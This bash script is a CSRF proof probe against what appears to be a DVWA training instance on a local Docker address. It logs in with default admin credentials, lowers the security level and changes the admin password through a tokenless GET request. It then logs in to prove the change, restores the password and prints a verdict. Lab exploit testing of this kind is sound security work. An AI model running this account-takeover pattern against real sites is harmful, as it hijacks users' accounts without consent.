#!/bin/bash
# CSRF probe for /vulnerabilities/csrf/ — Brain Engine v1
# Password change via GET (no token), prove with login, restore to 'password'.
MARKER="${1:-CSRF22-PROOF-9A}"
B="http://172.17.0.1:3100"
COOKIE="/tmp/csrf_brain_$$.txt"
NEWPW="csrf${MARKER}123"

echo "CSRF22-START marker=$MARKER"

# Login as admin
TOKEN=$(curl -s -c "$COOKIE" "$B/login.php" | grep -oP "name='user_token' value='\K[^']+")
curl -s -b "$COOKIE" -c "$COOKIE" -d "username=admin&password=password&Login=Login&user_token=$TOKEN" "$B/login.php" -o /dev/null

# Set security low
SECTOK=$(curl -s -b "$COOKIE" "$B/security.php" | grep -oP "name='user_token' value='\K[^']+")
curl -s -b "$COOKIE" -c "$COOKIE" -d "security=low&seclev_submit=Submit&user_token=$SECTOK" "$B/security.php" -o /dev/null
echo "SECSET=done"

# CSRF: change password via GET (no CSRF token)
curl -s -b "$COOKIE" "$B/vulnerabilities/csrf/?password_new=$NEWPW&password_conf=$NEWPW&Change=Change" -o /tmp/csrf_resp.html
PWCHANGE_RESP=$(grep -c "Password Changed" /tmp/csrf_resp.html)
echo "PWCHANGE_RESP=$PWCHANGE_RESP"

# Prove: login with new password
TOKEN2=$(curl -s -c "$COOKIE" "$B/login.php" | grep -oP "name='user_token' value='\K[^']+")
LOGIN_HTML=$(curl -s -L -b "$COOKIE" -c "$COOKIE" -d "username=admin&password=$NEWPW&Login=Login&user_token=$TOKEN2" "$B/login.php")
LOGIN_NEWPW_WELCOME=$(echo "$LOGIN_HTML" | grep -c "Welcome")
echo "LOGIN_NEWPW_WELCOME=$LOGIN_NEWPW_WELCOME"

# Restore password to 'password'
TOKEN3=$(curl -s -b "$COOKIE" "$B/login.php" | grep -oP "name='user_token' value='\K[^']+")
curl -s -b "$COOKIE" -c "$COOKIE" -d "username=admin&password=$NEWPW&Login=Login&user_token=$TOKEN3" "$B/login.php" -o /dev/null
curl -s -b "$COOKIE" "$B/vulnerabilities/csrf/?password_new=password&password_conf=password&Change=Change" -o /tmp/csrf_restore.html
PWRESTORE_RESP=$(grep -c "Password Changed" /tmp/csrf_restore.html)
echo "PWRESTORE_RESP=$PWRESTORE_RESP"

# Prove restore: login with 'password'
TOKEN4=$(curl -s -c "$COOKIE" "$B/login.php" | grep -oP "name='user_token' value='\K[^']+")
LOGIN2_HTML=$(curl -s -L -b "$COOKIE" -c "$COOKIE" -d "username=admin&password=password&Login=Login&user_token=$TOKEN4" "$B/login.php")
LOGIN_RESTORED_WELCOME=$(echo "$LOGIN2_HTML" | grep -c "Welcome")
echo "LOGIN_RESTORED_WELCOME=$LOGIN_RESTORED_WELCOME"

rm -f "$COOKIE" /tmp/csrf_resp.html /tmp/csrf_restore.html

if [ "$PWCHANGE_RESP" -ge 1 ] && [ "$LOGIN_NEWPW_WELCOME" -ge 1 ] && [ "$LOGIN_RESTORED_WELCOME" -ge 1 ]; then
    echo "VERDICT: CONFIRMED"
else
    echo "VERDICT: FAILED"
fi
